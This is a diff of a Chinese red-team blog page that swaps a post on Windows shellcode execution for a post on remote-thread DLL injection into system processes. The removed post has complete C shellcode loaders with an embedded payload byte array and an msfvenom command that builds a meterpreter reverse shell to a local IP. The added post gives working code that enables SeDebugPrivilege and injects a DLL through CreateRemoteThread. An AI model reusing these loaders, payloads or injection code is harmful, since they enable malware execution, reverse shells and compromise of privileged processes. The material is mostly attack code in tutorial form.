@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>执行shellcode的方法 | 九世的博客</title>
+  <title>远程线程注入(系统进程) | 九世的博客</title>
   <meta name="keywords" content=" 红队 ">
-  <meta name="description" content="执行shellcode的方法 | 九世的博客">
+  <meta name="description" content="远程线程注入(系统进程) | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1664,9 +1664,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-执行shellcode的方法" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-远程线程注入-系统进程" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">执行shellcode的方法</h1>
+        <h1 class="article-title">远程线程注入(系统进程)</h1>
     
     <div class="article-meta">
         
@@ -1682,7 +1682,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-04-17 00:08:24">2020-04-16 23:31</time>
+        创建时间:<time class="date" title="更新时间: 2021-03-15 00:07:06">2021-03-14 23:57</time>
         
     </div>
     <div class="article-meta">
@@ -1704,7 +1704,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进程内存布局"><span class="toc-text">进程内存布局</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#用户空间和系统空间"><span class="toc-text">用户空间和系统空间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分页池和非分页池"><span class="toc-text">分页池和非分页池</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#动态分配内存"><span class="toc-text">动态分配内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数指针的执行"><span class="toc-text">函数指针的执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TEXT段执行"><span class="toc-text">.TEXT段执行</span></a></li>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#用到的API函数"><span class="toc-text">用到的API函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1719,151 +1719,112 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看了篇介绍shellcode的文章，故此做个笔记。也可以理解为翻译文<br>原文链接：<a href="https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques" target="_blank" rel="noopener">A Beginner’s Guide to Windows Shellcode Execution Techniques | Context Information Security</a></p>
-<h2 id="进程内存布局"><a href="#进程内存布局" class="headerlink" title="进程内存布局"></a>进程内存布局</h2><p>需要理解的第一个概念是，整个虚拟内存空间分为两个相关部分:为用户进程保留的虚拟内存空间(用户空间)和为系统进程保留的虚拟内存空间(内核空间)，如下所示<br><img src="https://s1.ax1x.com/2020/04/16/JEVtUI.png" alt=""></p>
-<p>当处理器读写内存位置时，它使用一个虚拟地址。作为读写操作的一部分，处理器将虚拟地址转换为物理地址。通过虚拟地址访问内存具有这些优点:</p>
+        <p>最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到<br>系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。<br>然后联想到是不是权限的问题，试了一下确实是</p>
+<h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>远程线程注入：</p>
 <ul>
-<li>程序可以使用一个连续的虚拟地址范围来访问物理内存中不相邻的大内存缓冲区</li>
-<li>程序可以使用一定范围的虚拟地址来访问大于可用物理内存的内存缓冲区。随着物理内存供应的减少，内存管理器将物理内存页(通常为4 kb)保存到磁盘文件中。数据或代码页根据需要在物理内存和磁盘之间移动。</li>
-<li>不同进程使用的虚拟地址相互隔离。 一个进程中的代码无法更改另一进程或操作系统正在使用的物理内存。</li>
+<li>OpenProcess</li>
+<li>VirtualAllocEx</li>
+<li>WriteProcessMemory</li>
+<li>CreateRemoteThread</li>
 </ul>
-<p>进程可用的虚拟地址范围称为该进程的虚拟地址空间。 每个用户模式进程都有其自己的专用虚拟地址空间。 对于32位进程，虚拟地址空间通常为2 GB范围0x00000000至0x7FFFFFFF。 对于64位Windows上的64位进程，虚拟地址空间为128 TB范围0x000’00000000到0x7FFF’FFFFFFFF。 虚拟地址范围有时称为虚拟内存范围。</p>
-<p><img src="https://s1.ax1x.com/2020/04/16/JEVsbj.png" alt=""></p>
-<p>该图显示了两个64位进程的虚拟地址空间：Notepad.exe和MyApp.exe。 每个进程都有自己的虚拟地址空间，该地址空间从0x000’0000000到0x7FF’FFFFFFFF。 每个阴影块代表一页（4 KB）的虚拟或物理内存。 请注意，记事本进程使用三个连续的虚拟地址页面，从0x7F7’93950000开始。 但是虚拟地址的这三个连续页面被映射到物理内存中的非连续页面。 还要注意，两个进程都使用从0x7F7’93950000开始的虚拟内存页面，但是这些虚拟页面被映射到物理内存的不同页面。</p>
-<h4 id="用户空间和系统空间"><a href="#用户空间和系统空间" class="headerlink" title="用户空间和系统空间"></a>用户空间和系统空间</h4><p>诸如Notepad.exe和MyApp.exe之类的进程在用户模式下运行。 核心操作系统组件和许多驱动程序以特权更高的内核模式运行。 有关处理器模式的更多信息，请参阅用户模式和内核模式。 每个用户模式进程都有其自己的专用虚拟地址空间，但是以内核模式运行的所有代码共享一个称为系统空间的虚拟地址空间。 用户模式进程的虚拟地址空间称为用户空间。在32位Windows中，总的可用虚拟地址空间为2 ^ 32字节（4 GB）。 通常，较低的2 GB用于用户空间，较高的2 GB用于系统空间。</p>
-<p><img src="https://s1.ax1x.com/2020/04/16/JEVHaR.png" alt=""></p>
-<p>在32位Windows中，您可以选择（在启动时）指定超过2 GB的用户空间可用。 结果是更少的虚拟地址可用于系统空间。 您可以将用户空间的大小增加到3 GB，在这种情况下，系统空间只能使用1 GB。 要增加用户空间的大小<br>在64位Windows中，虚拟地址空间的理论量为2 ^ 64字节（16艾字节），但实际上仅使用了16艾字节范围的一小部分。 从0x000’00000000到0x7FF’FFFFFFFF的8 TB范围用于用户空间，从0xFFFF0800’00000000到0xFFFFFFFF’FFFFFFFF的248 TB范围的部分用于系统空间。</p>
-<p>在用户模式下运行的代码可以访问用户空间，但不能访问系统空间。 此限制可防止用户模式代码读取或更改受保护的操作系统数据结构。 以内核模式运行的代码可以访问用户空间和系统空间。 也就是说，以内核模式运行的代码可以访问系统空间和当前用户模式进程的虚拟地址空间。<br>在内核模式下运行的驱动程序在直接读取或写入用户空间中的地址时必须非常小心。 这种情况说明了原因。</p>
-<pre><code>1. 用户模式程序启动一个从设备读取一些数据的请求。 该程序提供缓冲区的起始地址以接收数据。
-2. 在内核模式下运行的设备驱动程序例程开始读取操作，并将控制权返回给其调用者。
-3. 稍后，设备中断当前正在运行的任何线程，以表示读取操作已完成。 中断由在此任意线程上运行的内核模式驱动程序例程处理，该线程属于任意进程。
-4. 此时，驱动程序不得将数据写入用户模式程序在步骤1中提供的起始地址。该地址位于发起请求的进程的虚拟地址空间中，这很可能与请求的地址不同。 当前的过程。
-</code></pre><h4 id="分页池和非分页池"><a href="#分页池和非分页池" class="headerlink" title="分页池和非分页池"></a>分页池和非分页池</h4><p>在用户空间中，可以根据需要将所有物理内存页面调出到磁盘文件中。 在系统空间中，可以将某些物理页面调出页面，而另一些则不能。 系统空间具有两个用于动态分配内存的区域：分页池和非分页池。<br>可以根据需要将分页池中分配的内存分页到磁盘文件中。 在未分页的池中分配的内存永远不能分页到磁盘文件中。<br><img src="https://s1.ax1x.com/2020/04/16/JEZFit.png" alt=""></p>
-<p>这样做的第一个收获是，每个进程都有自己的专用虚拟地址空间，其中“内核空间”是一种“共享环境”，这意味着每个内核进程都可以在其想要的任何地方读取/写入虚拟内存。 请注意，后者仅适用于没有基于虚拟化的安全性（VBS）的环境，但这是不同的主题。</p>
-<p>上面的表示显示了全局虚拟地址空间的样子，让我们将其分解为单个进程<br><img src="https://s1.ax1x.com/2020/04/16/JEZZQS.png" alt=""></p>
-<p>单个进程虚拟内存空间由多个部分组成，这些部分通过地址空间布局随机化（ASLR）放置在可用空间边界内的某个位置。 这些部分中的大多数应该是熟悉的，但是为了使所有人都在同一页面上，以下是这些部分的简要介绍</p>
-<p><strong>.TEXT(入口地址):</strong>  这是可执行进程映像所在的位置。在这个区域中，您将找到可执行文件的主入口，即执行流开始的地方<br><strong>. DATA(映像基址):</strong>.DATA节包含全局初始化或静态变量。 未绑定到特定功能的任何变量都存储在此处。<br><strong>.BSS(映像大小):</strong> 与. data段类似，此部分包含任何未初始化的全局变量或静态变量。<br><strong>HEAP:</strong> 这是所有动态局部变量的存储位置。 每次创建在运行时确定所需空间的对象时，所需的地址空间都会在HEAP中动态分配（通常使用alloc（）或类似的系统调用）。</p>
-<p><strong>STACK:</strong> 堆栈是分配给每个静态局部变量的位置。如果在函数中局部初始化一个变量，则该变量将被放置在堆栈上。</p>
-<p><img src="https://s1.ax1x.com/2020/04/16/JEZUeJ.png" alt=""></p>
-<h2 id="动态分配内存"><a href="#动态分配内存" class="headerlink" title="动态分配内存"></a>动态分配内存</h2><p>运行shellcode的步骤：</p>
-<ol>
-<li>您需要标记为可执行的虚拟地址空间（否则DEP会引发异常）</li>
-<li>您需要将您的shellcode放入该地址空间</li>
-<li>您需要将代码流定向到该内存区域</li>
-</ol>
-<p>完成这三个步骤的教科书方法是使用WinAPI调用来动态分配可读，可写和可执行（RWX）内存，并启动指向新分配的内存区域的线程。 用C编写代码看起来像这样：</p>
-<pre><code class="cpp">#include &quot;stdafx.h&quot;
-#include &lt;windows.h&gt;
-#include &lt;iostream&gt;
-using namespace std;
-int main()
-{
-       unsigned char shellcode[] =
-              &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;
-              &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
-              &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
-              &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
-              &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
-              &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;
-              &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;
-              &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;
-              &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;
-              &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;
-              &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;
-              &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;
-              &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;
-              &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
-              &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;
-              &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;
-              &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;
-              &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;
-              &quot;\x63\x2e\x65\x78\x65\x00&quot;;
-       //申请内存空间
-       LPVOID addressPointer = VirtualAlloc(NULL,sizeof(shellcode),0x3000,0x40);
-       //将您的shellcode放入该地址空间
-       RtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));
-    //创建线程
-       CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
-       Sleep(1000);
-       system(&quot;pause&quot;);
-       return 0;
+<p>特权开启：</p>
+<ul>
+<li>OpenProcessToken</li>
+<li>LookupPrivilegeValueA</li>
+<li>AdjustTokenPrivileges</li>
+</ul>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启SeDebugPrivilege特权</p>
+<pre><code class="C">bool EnbalePrivileges() {
+        HANDLE hToken = NULL;
+        LUID luidValue = { 0 };
+        TOKEN_PRIVILEGES tp = { 0 };
+        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);
+        if (wdret == NULL) {
+               errorprint(&quot;OpenProcessToken&quot;);
+        }
+        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue); //检索本地唯一性标识符的特定系统上用于局部地（LUID）表示指定的权限名称
+        if (privilege == false) {
+               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);
+        }
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luidValue;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL); //设置特权开启/关闭
+        if (bRet == false) {
+               errorprint(&quot;Enable Privilege Failure\n&quot;);
+        }
+        if (GetLastError() == ERROR_SUCCESS) {
+               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);
+        }
 }
 </code></pre>
-<p><img src="https://s1.ax1x.com/2020/04/17/JEZcOe.png" alt=""><br>使用windebug调试：</p>
-<pre><code>windbg：File-&gt;Open executtable打开exe
-
-lm #查看加载的模块
-g #运行
-</code></pre><p><img src="https://s1.ax1x.com/2020/04/17/JEZ5fP.png" alt=""></p>
-<p>文章原图<br><img src="https://s1.ax1x.com/2020/04/17/JEZTl8.md.png" alt=""></p>
-<p>注意：成熟的杀软/EDR系统很容易检测到WinAPI调用的使用</p>
-<h2 id="函数指针的执行"><a href="#函数指针的执行" class="headerlink" title="函数指针的执行"></a>函数指针的执行</h2><p>（在windows上并不行。。。）<br>在内存中执行shellcode的另一种技术是使用函数指针</p>
-<pre><code class="cpp">#include &quot;stdafx.h&quot;
-#include &lt;iostream&gt;
-using namespace std;
+<p>完整代码</p>
+<pre><code class="C">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,name,GetLastError());return 1;}
+bool EnbalePrivileges() {
+        HANDLE hToken = NULL;
+        LUID luidValue = { 0 };
+        TOKEN_PRIVILEGES tp = { 0 };
+        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);
+        if (wdret == NULL) {
+               errorprint(&quot;OpenProcessToken&quot;);
+        }
+        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue);
+        if (privilege == false) {
+               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);
+        }
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luidValue;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL);
+        if (bRet == false) {
+               errorprint(&quot;Enable Privilege Failure\n&quot;);
+        }
+        if (GetLastError() == ERROR_SUCCESS) {
+               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);
+        }
+}
 int main()
 {
-       unsigned char shellcode[] =
-              &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;
-              &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
-              &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
-              &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
-              &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
-              &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;
-              &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;
-              &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;
-              &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;
-              &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;
-              &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;
-              &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;
-              &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;
-              &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
-              &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;
-              &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;
-              &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;
-              &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;
-              &quot;\x63\x2e\x65\x78\x65\x00&quot;;
-       int(*func)();
-       func = (int(*)()) (void*)shellcode; //创建了一个匿名指针函数（lamba）
-       (int)(*func)(); //运行匿名函数
-       // Shortcut way to do it
-       // (*(int(*)()) buf)();
-       // sleep for a second
-       Sleep(1000);
-       return 0;
-}
-</code></pre>
-<p>运行过程：</p>
-<ol>
-<li>在上述代码段中声明了一个指向函数的指针，该函数指针名为“ func”</li>
-<li>然后，为已声明的函数指针分配要执行的代码的地址（由于将为变量分配一个值，因此为func指针分配一个地址）</li>
-<li>最后，调用函数指针，这意味着将执行流定向到分配的地址</li>
-</ol>
-<p>windbg调试<br><img src="https://s1.ax1x.com/2020/04/17/JEeB7j.png" alt=""></p>
-<h2 id="TEXT段执行"><a href="#TEXT段执行" class="headerlink" title=".TEXT段执行"></a>.TEXT段执行</h2><p>仓库地址：<a href="https://github.com/Mr-Un1k0d3r/Shellcoding" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/Shellcoding</a><br>C执行asm（只能32位）</p>
-<pre><code class="cpp">#include &lt;Windows.h&gt;
-
-
-int main() {
-    asm(&quot;call code\n\t&quot;
-        &quot;.byte &lt;shellcode&gt;\n\t&quot;
-        &quot;code:\n\t&quot;
-        &quot;ret\n\t&quot;);
-
-
+        int pid = 1148;
+        EnbalePrivileges();
+        char *dllname = &quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;;
+        int dllnamesize = strlen(dllname) * 2;
+        HANDLE pidmodule = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+        if (pidmodule == NULL) {
+               printf(&quot;OpenProcess Error Code:%d\n&quot;, GetLastError());
+               return 1;
+        }
+        printf(&quot;OpenProcess HANDLE 0x%x\n&quot;, pidmodule);
+        LPVOID vaeAddr = VirtualAllocEx(pidmodule, NULL, dllnamesize, MEM_COMMIT,  PAGE_READWRITE);
+        if (vaeAddr == NULL) {
+               printf(&quot;VirtualAllocEx Error Code:%d\n&quot;, GetLastError());
+               return 1;
+        }
+        printf(&quot;VirtualAllocEx Sucess 0x%x\n&quot;, vaeAddr);
+        if (false == WriteProcessMemory(pidmodule, vaeAddr, dllname, dllnamesize, NULL)) {
+               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;, GetLastError());
+               return 1;
+        }
+        printf(&quot;WriteProcessMemory Sucess\n&quot;);
+        FARPROC loadaddress = GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),  &quot;LoadLibraryA&quot;);
+        if (loadaddress == NULL) {
+               printf(&quot;Get Kernel32 Address Error Code:%d\n&quot;, GetLastError());
+               return 1;
+        }
+        printf(&quot;Get Function LoadlibraryA Function Address:0x%x\n&quot;, loadaddress);
+        HANDLE runthread = CreateRemoteThread(pidmodule, NULL, 0,  (LPTHREAD_START_ROUTINE)loadaddress, vaeAddr, 0, NULL);
+        if (runthread == NULL) {
+               printf(&quot;CreateRemoteThread Error Code:%d\n&quot;, GetLastError());
+        }
+        printf(&quot;CreateRemoteThread Sucess\n&quot;);
+        system(&quot;pause&quot;);
     return 0;
 }
 </code></pre>
-<p>msf生成32位的shellcode</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 -f raw -o test.bin
-</code></pre><p>转换成shellcode</p>
-<pre><code>python makefile.py test.bin cnmb.c
-</code></pre><p>编译</p>
-<pre><code>gcc  -c cnmb.c -o cnmb.o
-gcc -o cnmb.exe cnmb.o
-</code></pre><p><img src="https://s1.ax1x.com/2020/04/17/JEec90.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/04/17/JEefuF.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/04/17/JEejDe.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/03/15/6BMHaD.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41890599/article/details/108771480" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/108771480</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1873,12 +1834,12 @@ gcc -o cnmb.exe cnmb.o
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>执行shellcode的方法</p>
+    <p><span class="copy-title">文章标题:</span>远程线程注入(系统进程)</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-04-16, 23:31:28</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-17, 00:08:24</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/44310b89.html" title="执行shellcode的方法">http://422926799.github.io/posts/44310b89.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-03-14, 23:57:27</p>
+    <p><span class="copy-title">最后更新:</span>2021-03-15, 00:07:06</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b76f927c.html" title="远程线程注入(系统进程)">http://422926799.github.io/posts/b76f927c.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
